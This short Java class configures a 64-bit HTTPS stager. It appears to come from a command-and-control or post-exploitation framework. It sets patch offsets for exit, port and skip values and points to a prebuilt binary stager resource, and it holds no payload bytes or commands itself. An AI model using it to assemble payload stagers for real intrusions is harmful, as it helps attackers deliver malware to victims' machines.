package stagers;

import common.Listener;

public abstract class GenericHTTPSStagerX64
        extends GenericHTTPStager {
    public GenericHTTPSStagerX64(Listener l) {
        super(l);
    }

    @Override
    public int getExitOffset() {
        return 811;
    }

    @Override
    public int getPortOffset() {
        return 274;
    }

    @Override
    public int getSkipOffset() {
        return 898;
    }

    @Override
    public String arch() {
        return "x64";
    }

    @Override
    public String getStagerFile() {
        return "resources/httpsstager64.bin";
    }
}

